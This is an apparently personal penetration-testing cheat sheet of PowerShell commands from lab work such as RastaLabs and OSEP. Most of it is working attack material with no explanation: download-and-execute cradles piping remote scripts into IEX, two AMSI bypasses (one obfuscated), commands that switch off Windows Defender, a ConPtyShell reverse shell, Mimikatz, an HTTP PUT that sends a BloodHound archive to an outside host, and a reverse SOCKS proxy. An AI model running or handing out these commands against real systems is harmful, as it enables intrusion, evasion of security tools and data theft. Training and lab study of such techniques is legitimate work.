* https://github.com/samratashok/nishang

``` a
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass
```

* PS-Run with output
``` powershell
& .\hidden-test.exe 2>&1
```
* PS-Run without output
``` powershell
Start-Process notepad.exe
```

## PSRemoting
``` powershell
Enter-PSSession -ComputerName WS05.RASTALABS.LOCAL -Credential RASTALABS.LOCAL\NGODFREY
```
``` powershell
(new-object system.net.webclient).downloadstring('http://192.168.99.2/powerview.ps1') | IEX
invoke-webrequest http://10.10.16.29:8080/dazzleUP.exe -outfile dazzleUP.exe
invoke-webrequest http://10.10.16.14:8080/hidden-test.exe -outfile C:\windows\temp\test.exe
```
## Port Scan
``` powershell
80,8080,445,139,135,3389,1433,5985,47001 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“10.10.16.29”,$_)) “Port $_ is open!”} 2>$null
```

## Test AV
``` powershell
Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
Invoke-Mimikatz
'amsiutils'
```
``` powershell
Get-MpComputerStatus
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -Force -MAPSReporting Disabled
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f

reg query "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## Create service
``` powershell
New-Service -Name "gruntsvc" -BinaryPathName '"C:\WINDOWS\System32\svchost.exe -k netsvcs"'
Start-Service -Name 'gruntsvc'
Stop-Service -Name 'gruntsvc'
Restart-Service -Name 'gruntsvc'
$service = Get-WmiObject -Class Win32_Service -Filter "Name='gruntsvc'"
$service.delete()
```

## read/write
``` powershell
IEX(Get-Content .\Invoke-ConPtyShell.ps1 -Raw); Invoke-ConPtyShell 10.0.0.2 3001
Get-Content -Path 'C:\Demo\test.txt' -Encoding Byte
```
``` powershell
$a = [IO.File]::ReadAllText("C:\Users\John\Desktop\test.txt")
[system.Convert]::toBase64string([System.text.encoding]::Unicode.getbytes($a))
```
``` powershell
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b))
[System.IO.File]::WriteAllText("Z:\backup\PTA\CRTE\tgt-sqladmin",$b)
```
``` powershell
$filename = "C:\tools\donut\loader.bin"
[system.Convert]::toBase64string([IO.File]::ReadAllBytes($filename)) | Clip
```


## AMSI
``` powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
``` powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## PS
* The native ``IncludeUserName`` need admin privilege
``` powershell
Get-Process -IncludeUserName | Format-Table Id,Username,Name,si,FileName -AutoSize
Get-Process | Format-Table Id,Name,si,FileName -AutoSize
```
``` powershell
$owners = @{}
gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
```

## Applocker
``` powershell
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## From service name to display name
``` powershell
powerpick Get-Service –Name "MSSQL*"
```
## DownloadExec
``` powershell
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/PowerUp.ps1')) | iex 
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/PowerUpSQL.ps1')) | iex 
((New-Object Net.WebClient).DownloadString('http://10.10.16.29:8080/Find-PSRemotingLocalAdminAccess.ps1')) | iex 
```

## PUT File
``` powershell
$filename = "C:\Users\[username]\20210208113930_BloodHound.zip"
$body = [system.Convert]::toBase64string([IO.File]::ReadAllBytes($filename))
Invoke-RestMethod -Uri http://192.168.49.108/secret.zip -Method PUT -Body $body
```
``` powershell
$a = [IO.File]::ReadAllText("Z:\myshare\backup\OSEP\labnotes\challenge6\secret.hex")
$b = [System.Convert]::FromBase64String($a)
[System.IO.File]::WriteAllBytes("Z:\myshare\backup\OSEP\labnotes\challenge6\secret.zip",$b)

```

## Net Version
``` powershell
get-childitem -path "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

## Formating
``` powershell
Format-List *
```

## which
``` powershell
get-command
```

## if x64
``` powershell
[Environment]::Is64BitProcess
```

## Proxy
``` a
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
python2 ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
```
``` powershell
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 

# Go through the system proxy:
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy

# Validate certificate
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'

# Give up after a number of failed connections to the handler:
Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 10
```
